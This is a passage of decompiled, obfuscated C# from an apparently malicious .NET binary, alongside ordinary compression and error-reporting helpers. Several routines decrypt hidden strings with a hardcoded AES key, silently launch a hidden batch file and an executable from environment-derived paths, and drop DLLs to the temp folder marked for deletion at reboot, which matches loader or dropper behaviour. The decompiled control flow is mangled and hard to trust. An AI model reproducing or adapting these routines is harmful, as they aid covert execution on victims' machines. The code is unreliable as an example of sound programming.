				if (Class25.dictionary_0.ContainsKey(text2))
				{
					result = Class25.dictionary_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_0265;
					}
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class56.smethod_145(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								MoveFileEx(text5, null, 4);
								MoveFileEx(text4, null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class25.dictionary_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_0265;
		IL_0265:
		return null;
	}

	static void smethod_32()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 228:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_004c;
						case 5:
							goto IL_0055;
						case 6:
							goto IL_0064;
						case 7:
							goto IL_0082;
						case 8:
							goto IL_008c;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_008c:
					num = 8;
					processStartInfo.CreateNoWindow = true;
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_004c;
					IL_004c:
					num = 4;
					text3 = "cm";
					goto IL_0055;
					IL_0055:
					num = 5;
					if (Class56.smethod_77("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0064;
					IL_0064:
					num = 6;
					processStartInfo = new ProcessStartInfo(text2 + Class56.smethod_95("#thenwfol#") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
					goto IL_0082;
					IL_0082:
					num = 7;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_008c;
					end_IL_0000_2:
					break;
				}
				num = 9;
				Process.Start(processStartInfo);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 228;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_33(Class45.Struct22 struct22_0, Class45 class45_0)
	{
		string key = struct22_0.struct21_0.string_0.ToUpper();
		if (class45_0.dictionary_3.ContainsKey(key))
		{
			return class45_0.dictionary_3[key];
		}
		int count = class45_0.list_2.Count;
		class45_0.list_2.Add(struct22_0.struct21_0);
		class45_0.dictionary_3.Add(key, count);
		return count;
	}

	static int smethod_34(Font font_0, string string_0, int int_0, Graphics graphics_0)
	{
		Class58.Struct23 struct23_;
		int int_ = default(int);
		IntPtr hdc = default(IntPtr);
		IntPtr intptr_ = default(IntPtr);
		while (true)
		{
			struct23_ = new Class58.Struct23(new Rectangle(0, 0, int_0, 10000));
			if (eBBp0Op7wSDKHwLe0VT())
			{
				switch (4)
				{
				case 5:
					break;
				case 1:
				case 4:
					int_ = 3088;
					goto case 0;
				case 0:
					hdc = graphics_0.GetHdc();
					intptr_ = font_0.ToHfont();
					goto IL_0061;
				default:
					goto IL_0061;
				case 6:
					goto end_IL_0001;
				}
				continue;
			}
			goto IL_0061;
			IL_0061:
			IntPtr intptr_2 = SelectObject(hdc, intptr_);
			DrawText(hdc, string_0, -1, ref struct23_, int_);
			SelectObject(hdc, intptr_2);
			graphics_0.ReleaseHdc(hdc);
			break;
			continue;
			end_IL_0001:
			break;
		}
		return struct23_.int_3 - struct23_.int_1;
	}

	static void smethod_35(Class31.Class38.Class39 class39_0, int int_0)
	{
		Class56.smethod_12(class39_0.class38_0.class41_0, class39_0.short_1[int_0] & 0xFFFF, (int)class39_0.byte_0[int_0]);
	}

	static string smethod_36(string string_0)
	{
		string password = "nia";
		string s = "cffffffffffffffffff";
		int num2 = default(int);
		byte[] bytes = default(byte[]);
		byte[] bytes2 = default(byte[]);
		ICryptoTransform transform = default(ICryptoTransform);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		byte[] bytes3 = default(byte[]);
		byte[] array = default(byte[]);
		string @string = default(string);
		while (true)
		{
			string text = "SHA1";
			int iterations = 2;
			while (true)
			{
				string s2 = "@1B2c3D4e5F6g7H8";
				int num = 7;
				if (!J5IwCwpfghTToLC3MgK())
				{
				}
				while (true)
				{
					switch (num)
					{
					case 2:
					case 7:
						num2 = 256;
						bytes = Encoding.ASCII.GetBytes(s2);
						bytes2 = Encoding.ASCII.GetBytes(s);
						goto default;
					case 1:
					case 4:
						transform = rijndaelManaged.CreateDecryptor(bytes3, bytes);
						goto case 6;
					case 6:
					{
						MemoryStream memoryStream = new MemoryStream(array);
						CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
						byte[] array2 = new byte[checked(array.Length - 1 + 1)];
						int count = cryptoStream.Read(array2, 0, array2.Length);
						memoryStream.Close();
						cryptoStream.Close();
						@string = Encoding.UTF8.GetString(array2, 0, count);
						num = 8;
						if (eBBp0Op7wSDKHwLe0VT())
						{
							continue;
						}
						goto default;
					}
					default:
					{
						array = Convert.FromBase64String(string_0);
						Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes2, iterations);
						bytes3 = rfc2898DeriveBytes.GetBytes(num2 / 8);
						rijndaelManaged = new RijndaelManaged();
						rijndaelManaged.Mode = CipherMode.CBC;
						goto case 1;
					}
					case 3:
						break;
					case 5:
						goto end_IL_00ff;
					case 8:
						return @string;
					}
					break;
				}
				continue;
				end_IL_00ff:
				break;
			}
		}
	}

	static void smethod_37(Control0 control0_0)
	{
		Class56.smethod_28(string.Empty, control0_0);
	}

	static void smethod_38(Class31.Class34 class34_0)
	{
		int num = 0;
		class34_0.int_0 = 0;
		class34_0.int_1 = 0;
	}

	static void smethod_39(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class56.smethod_46(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static int smethod_40(Class31.Class37 class37_0, byte[] byte_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		int result = default(int);
		while (true)
		{
			int num3 = num2;
			while (true)
			{
				int num4 = Class56.smethod_0(class37_0.class41_0, byte_0, num, num2);
				num += num4;
				class37_0.long_0 += num4;
				num2 -= num4;
				while (true)
				{
					IL_00df:
					if (num2 != 0 && class37_0.int_0 != 30)
					{
						Class31.Class40 class40_ = class37_0.class40_0;
						bool bool_ = (class37_0.int_0 & 4) != 0;
						bool bool_2 = (class37_0.int_0 & 8) != 0;
						while (!Class56.smethod_141(bool_, class40_, bool_2))
						{
							if (class37_0.int_0 != 16)
							{
								if (class37_0.int_0 == 20)
								{
									int num5 = 8 + (-class37_0.class41_0.BitCount & 7);
									while (true)
									{
										if (num5 > 0)
										{
											Class56.smethod_12(class37_0.class41_0, 2, 10);
											while (true)
											{
												num5 -= 10;
												if (eBBp0Op7wSDKHwLe0VT())
												{
													switch (8)
													{
													case 5:
														break;
													default:
														goto end_IL_0083;
													case 7:
														goto IL_00cd;
													case 1:
													case 6:
														goto IL_00df;
													case 9:
														goto end_IL_00c6;
													case 0:
													case 4:
														goto end_IL_010e;
													case 2:
														goto IL_014b;
													}
													continue;
												}
												goto IL_014b;
												IL_014b:
												return result;
												continue;
												end_IL_0083:
												break;
											}
											continue;
										}
										class37_0.int_0 = 16;
										break;
										continue;
										end_IL_00c6:
										break;
									}
								}
								else if (class37_0.int_0 == 28)
								{
									Class56.smethod_137(class37_0.class41_0);
									class37_0.int_0 = 30;
								}
								break;
							}
							return num3 - num2;
							IL_00cd:;
						}
						break;
					}
					return num3 - num2;
				}
				continue;
				end_IL_010e:
				break;
			}
		}
	}

	static void smethod_41()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text6 = default(string);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				object executablePath;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 413:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0033;
						case 5:
							goto IL_004d;
						case 6:
							goto IL_007a;
						case 7:
							goto IL_0083;
						case 8:
							goto IL_008c;
						case 9:
							goto IL_00af;
						case 10:
							goto IL_00bf;
						case 11:
							goto IL_00d4;
						case 12:
							goto IL_00e3;
						case 13:
							goto IL_00f0;
						case 14:
							goto IL_00ff;
						case 15:
							goto IL_011c;
						case 16:
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_011c:
					num = 15;
					Conversion.Int(3405);
					break;
					IL_0008:
					num = 2;
					text = "GDGDF54545";
					goto IL_0011;
					IL_0011:
					num = 3;
					text2 = Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0033;
					IL_0033:
					num = 4;
					if (Operators.CompareString(text, Class56.smethod_95("SYgwSIDqN1G8QkK/jvXMGw=="), false) != 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_004d;
					IL_004d:
					num = 5;
					text3 = "" + Interaction.Environ(Class56.smethod_95("5g+BxFHXkdTcEM3cEGgk0A==")) + Class56.smethod_95("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
					goto IL_007a;
					IL_007a:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_0083;
					IL_0083:
					num = 7;
					text4 = "ows\\CurrentV";
					goto IL_008c;
					IL_008c:
					num = 8;
					text5 = "" + Interaction.Environ(Class56.smethod_95("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_00af;
					IL_00af:
					num = 9;
					text6 = Class56.smethod_95("Rx4K5yj4QnSzaKx9pdBAPA==");
					goto IL_00bf;
					IL_00bf:
					num = 10;
					text7 = Interaction.Environ(Class56.smethod_95("rRhnphBugUiRcVlpVgLfjw=="));
					goto IL_00d4;
					IL_00d4:
					num = 11;
					Conversion.Int(3405);
					goto IL_00e3;
					IL_00e3:
					num = 12;
					if (Class56.smethod_77(text6))
					{
						break;
					}
					goto IL_00f0;
					IL_00f0:
					num = 13;
					Conversion.Int(3405);
					goto IL_00ff;
					IL_00ff:
					num = 14;
					Process.Start(text7 + "\\" + text6 + ".exe");
					goto IL_011c;
					end_IL_0000_2:
					break;
				}
				num = 17;
				Conversion.Int(3405);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 413;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_42(Class31.Stream0 stream0_0)
	{
		return Class56.smethod_64(stream0_0) | (Class56.smethod_64(stream0_0) << 16);
	}

	static void smethod_43(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class56.smethod_46(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static void smethod_44(Class45 class45_0)
	{
		while (true)
		{
			EventHandler eventHandler_ = class45_0.eventHandler_0;
			if (!J5IwCwpfghTToLC3MgK())
			{
				switch (4)
				{
				case 0:
				case 2:
					break;
				case 1:
				case 4:
					goto IL_0034;
				default:
					goto IL_0037;
				case 5:
					return;
				}
				continue;
			}
			goto IL_0034;
			IL_0037:
			eventHandler_(class45_0, EventArgs.Empty);
			break;
			IL_0034:
			if (eventHandler_ == null)
			{
				break;
			}
			goto IL_0037;
		}
	}

	static void smethod_45(string string_0, Class57 class57_0, string string_1, string string_2, Delegate21 delegate21_0, byte[] byte_0)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class57_0.string_2);
			if (class57_0.iwebProxy_0 != null)
			{
				((HttpWebClientProtocol)reportingService).set_Proxy(class57_0.iwebProxy_0);
			}
			delegate21_0(reportingService.UploadReport2(class57_0.string_1, byte_0, string_0, string_1, string_2));
		}
		catch (Exception ex)
		{
			delegate21_0("ERR 2002: " + ex.Message);
		}
	}

	static void smethod_46(Exception exception_0, object[] object_0)
	{
		if (eBBp0Op7wSDKHwLe0VT())
		{
			switch (3)
			{
			case 3:
				break;
			case 0:
			case 1:
				goto IL_0030;
			default:
				goto IL_0032;
			case 5:
				goto IL_003b;
			}
		}
		int methodID = -1;
		goto IL_0030;
		IL_003b:
		int num3 = default(int);
		try
		{
			if (exception_0.StackTrace != null)
			{
				int num = 1;
				if (!J5IwCwpfghTToLC3MgK())
				{
				}
				int num2 = default(int);
				string[] array = default(string[]);
				while (true)
				{
					switch (num)
					{
					case 3:
					case 5:
						if (num2 < array.Length)
						{
							string text = array[num2];
							if (text.Length > 0)
							{
								break;
							}
							goto IL_006d;
						}
						goto end_IL_00b2;
					case 0:
					case 1:
						{
							string[] array2 = exception_0.StackTrace!.Split('\r', '\n');
							array = array2;
							num2 = 0;
							goto case 3;
						}
						IL_00ac:
						num3++;
						goto IL_006d;
						IL_006d:
						num2++;
						num = 5;
						if (!J5IwCwpfghTToLC3MgK())
						{
							continue;
						}
						goto case 0;
					}
					goto IL_00ac;
					continue;
					end_IL_00b2:
					break;
				}
			}
		}
		catch
		{
			num3 = -1;
		}
		StackTrace stackTrace = default(StackTrace);
		int ilOffset = default(int);
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				methodID = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				ilOffset = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(methodID, object_0, ilOffset, num3);
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains("SmartStackFrames"))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data["SmartStackFrames"] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
			}
			linkedList.AddLast(value);
			return;
		}
		catch
		{
			return;
		}
		IL_0032:
		num3 = 0;
		stackTrace = new StackTrace(exception_0);
		goto IL_003b;
		IL_0030:
		ilOffset = -1;
		goto IL_0032;
	}

	static string smethod_47()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	static int smethod_48(Class31.Class33 class33_0, int int_0)
	{
		if (class33_0.int_2 < int_0)
		{
			if (class33_0.int_0 == class33_0.int_1)
			{
				return -1;
			}
			class33_0.uint_0 |= (uint)(((class33_0.byte_0[class33_0.int_0++] & 0xFF) | ((class33_0.byte_0[class33_0.int_0++] & 0xFF) << 8)) << class33_0.int_2);
			class33_0.int_2 += 16;
		}
		return (int)(class33_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_49(Class53 class53_0)
	{
		try
		{
			Graphics val = ((Control)class53_0).CreateGraphics();
			try
			{
				string text = ((Control)class53_0).get_Text();
				int num = default(int);
				if (!J5IwCwpfghTToLC3MgK())
				{
					Font font = default(Font);
					int width = default(int);
					switch (3)
					{
					case 3:
						font = ((Control)class53_0).get_Font();
						width = ((Control)class53_0).get_Width();
						goto case 1;
					case 1:
					case 4:
						num = Class56.smethod_25(text, width, val, font);
						break;
					case 5:
						goto IL_005a;
					}
				}
				if (num <= 0)
				{
					return;
				}
				goto IL_005a;
				IL_005a:
				((Control)class53_0).set_Height(num);
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static void smethod_50(Control3 control3_0, bool bool_0)
	{
		control3_0.timer_0.set_Enabled(bool_0);
		control3_0.int_0 = 0;
		((Control)control3_0).Refresh();
	}

	static void smethod_51(Class44 class44_0, Enum4 enum4_0, string string_0)
	{
		Class56.smethod_139(class44_0, enum4_0, string_0, string.Empty);
	}

	static int smethod_52(Class31.Class34 class34_0)
	{
		return 32768 - class34_0.int_1;
	}

	static Exception smethod_53(Exception exception_0, object[] object_0)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == "{report}")
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class56.smethod_46(exception_0, object_0);
			}
			Class54.Handler.method_3(exception_0, bool_1: true, bool_2: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(exception_0.Message, SoapException.ServerFaultCode);
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static void smethod_54(Class31.Class33 class33_0)
	{
		class33_0.uint_0 >>= class33_0.int_2 & 7;
		class33_0.int_2 &= -8;
	}

	static void smethod_55(int int_0, bool bool_0, byte[] byte_0, int int_1, Class31.Class38 class38_0)
	{
		class38_0.class39_0.short_0[256]++;
		Class56.smethod_19(class38_0.class39_0);
		Class56.smethod_19(class38_0.class39_1);
		Class56.smethod_168(class38_0.class39_0, class38_0.class39_2);
		Class56.smethod_168(class38_0.class39_1, class38_0.class39_2);
		Class56.smethod_19(class38_0.class39_2);
		int num = 4;
		for (int num2 = 18; num2 > num; num2--)
		{
			if (class38_0.class39_2.byte_0[Class31.Class38.int_0[num2]] > 0)
			{
				num = num2 + 1;
			}
		}
		int num3 = 14 + num * 3 + Class56.smethod_135(class38_0.class39_2) + Class56.smethod_135(class38_0.class39_0) + Class56.smethod_135(class38_0.class39_1) + class38_0.int_2;
		int num4 = class38_0.int_2;
		for (int i = 0; i < 286; i++)
		{
			num4 += class38_0.class39_0.short_0[i] * Class31.Class38.byte_2[i];
		}
		for (int j = 0; j < 30; j++)
		{
			num4 += class38_0.class39_1.short_0[j] * Class31.Class38.byte_3[j];
		}
		if (num3 >= num4)
		{
			num3 = num4;
		}
		if (int_0 >= 0 && int_1 + 4 < num3 >> 3)
		{
			Class56.smethod_154(int_1, bool_0, class38_0, byte_0, int_0);
		}
		else if (num3 == num4)
		{
			Class56.smethod_12(class38_0.class41_0, 2 + (bool_0 ? 1 : 0), 3);
			Class31.Class38.Class39 class39_ = class38_0.class39_0;
			short[] short_ = Class31.Class38.short_1;
			byte[] byte_ = Class31.Class38.byte_2;
			Class56.smethod_142(short_, byte_, class39_);
			class39_ = class38_0.class39_1;
			short_ = Class31.Class38.short_2;
			byte_ = Class31.Class38.byte_3;
			Class56.smethod_142(short_, byte_, class39_);
			Class56.smethod_125(class38_0);
			Class56.smethod_27(class38_0);
		}
		else
		{
			Class56.smethod_12(class38_0.class41_0, 4 + (bool_0 ? 1 : 0), 3);
			Class56.smethod_68(num, class38_0);
			Class56.smethod_125(class38_0);
			Class56.smethod_27(class38_0);
		}
	}

	static int smethod_56(Class31.Class33 class33_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		int result = default(int);
		while (true)
		{
			if (class33_0.int_2 > 0 && int_1 > 0)
			{
				byte_0[int_0++] = (byte)class33_0.uint_0;
				while (true)
				{
					class33_0.uint_0 >>= 8;
					class33_0.int_2 -= 8;
					int_1--;
					if (!eBBp0Op7wSDKHwLe0VT())
					{
						break;
					}
					switch (2)
					{
					case 5:
						continue;
					case 1:
					case 2:
						goto IL_006b;
					case 0:
						goto end_IL_0017;
					case 4:
					case 6:
						goto IL_0097;
					case 7:
						goto end_IL_006f;
					}
					return result;
					continue;
					end_IL_0017:
					break;
				}
			}
			if (int_1 == 0)
			{
				return num;
			}
			int num2 = class33_0.int_1 - class33_0.int_0;
			if (int_1 > num2)
			{
				int_1 = num2;
			}
			goto IL_0097;
			IL_006b:
			num++;
			continue;
			IL_0097:
			Array.Copy(class33_0.byte_0, class33_0.int_0, byte_0, int_0, int_1);
			class33_0.int_0 += int_1;
			if (((uint)(class33_0.int_0 - class33_0.int_1) & (true ? 1u : 0u)) != 0)
			{
				class33_0.uint_0 = class33_0.byte_0[class33_0.int_0++] & 0xFFu;
				class33_0.int_2 = 8;
			}
			break;
			continue;
			end_IL_006f:
			break;
		}
		return num + int_1;
	}

	static bool smethod_57(object[] object_0)
	{
		int num = 1;
		do
		{
			if (!Class56.smethod_109(object_0))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 5);
		return false;
	}

	static byte[] smethod_58(byte[] byte_0, int int_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			Class31.Stream0 stream = new Class31.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class31.Class37 class2 = new Class31.Class37();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_2.Length;
				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_2[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class56.smethod_11(stream, 67324752);
				Class56.smethod_161(stream, 20);
				Class56.smethod_161(stream, 0);
				Class56.smethod_161(stream, 8);
				Class56.smethod_11(stream, (int)num3);
				Class56.smethod_11(stream, (int)num5);
				long position3 = stream.Position;
				Class56.smethod_11(stream, 0);
				Class56.smethod_11(stream, byte_2.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class56.smethod_161(stream, bytes.Length);
				Class56.smethod_161(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class56.smethod_91(byte_2, class2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					int num8 = Class56.smethod_40(class2, array9);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class56.smethod_87(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					int num9 = Class56.smethod_40(class2, array10);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long totalOut = class2.TotalOut;
				Class56.smethod_11(stream, 33639248);
				Class56.smethod_161(stream, 20);
				Class56.smethod_161(stream, 20);
				Class56.smethod_161(stream, 0);
				Class56.smethod_161(stream, 8);
				Class56.smethod_11(stream, (int)num3);
				Class56.smethod_11(stream, (int)num5);
				Class56.smethod_11(stream, (int)totalOut);
				Class56.smethod_11(stream, byte_2.Length);
				Class56.smethod_161(stream, bytes.Length);
				Class56.smethod_161(stream, 0);
				Class56.smethod_161(stream, 0);
				Class56.smethod_161(stream, 0);
				Class56.smethod_161(stream, 0);
				Class56.smethod_11(stream, 0);
				Class56.smethod_11(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class56.smethod_11(stream, 101010256);
				Class56.smethod_161(stream, 0);
				Class56.smethod_161(stream, 0);
				Class56.smethod_161(stream, 1);
				Class56.smethod_161(stream, 1);
				Class56.smethod_11(stream, 46 + bytes.Length);
				Class56.smethod_11(stream, (int)(30 + bytes.Length + totalOut));
				Class56.smethod_161(stream, 0);
				stream.Seek(position3, SeekOrigin.Begin);
				Class56.smethod_11(stream, (int)totalOut);
				break;
			}
			case 1:
			{
				Class56.smethod_11(stream, 25000571);
				Class56.smethod_11(stream, byte_2.Length);
				byte[] array5;
				for (int i = 0; i < byte_2.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_2.Length - i)];
					Buffer.BlockCopy(byte_2, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class56.smethod_11(stream, 0);
					Class56.smethod_11(stream, array5.Length);
					Class31.Class37 @class = new Class31.Class37();
					Class56.smethod_91(array5, @class);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						int num = Class56.smethod_40(@class, array6);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class56.smethod_87(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						int num2 = Class56.smethod_40(@class, array7);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
